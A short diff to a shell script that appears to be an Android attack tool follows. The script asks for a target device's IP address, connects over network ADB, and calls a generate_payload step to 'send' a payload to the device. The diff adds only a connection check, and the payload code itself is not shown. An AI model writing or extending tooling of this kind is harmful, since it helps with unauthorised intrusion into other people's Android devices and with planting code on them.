@@ -35,6 +35,14 @@ read -p "Enter the target Android device IP address: " target_ip
 # Establish a connection to the Android device
 adb connect $target_ip
 
+# Check if the connection was successful
+if adb devices | grep -q "$target_ip:5555"; then
+    echo "Connected to the Android device."
+else
+    echo "Failed to connect to the Android device. Please check the IP address and try again."
+    exit 1
+fi
+
 # Generate a payload and send it to the target device
 generate_payload $target_ip
 
